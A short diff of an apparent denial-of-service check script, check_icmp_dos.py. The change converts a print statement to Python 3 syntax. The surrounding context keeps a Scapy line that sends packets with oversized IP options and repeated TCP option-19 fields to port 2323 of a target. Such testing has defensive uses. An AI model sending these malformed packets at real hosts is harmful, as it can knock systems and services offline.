@@ -17,4 +17,4 @@ if __name__ == '__main__':
 		    send(IP(dst=check_ip,options=[IPOption("A"*i)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
 		print ("[*] Check Over!! ")
 	except Exception as e:
-		print "[*] usage: sudo python check_icmp_dos.py 127.0.0.1"
+		print ("[*] usage: sudo python check_icmp_dos.py 127.0.0.1")
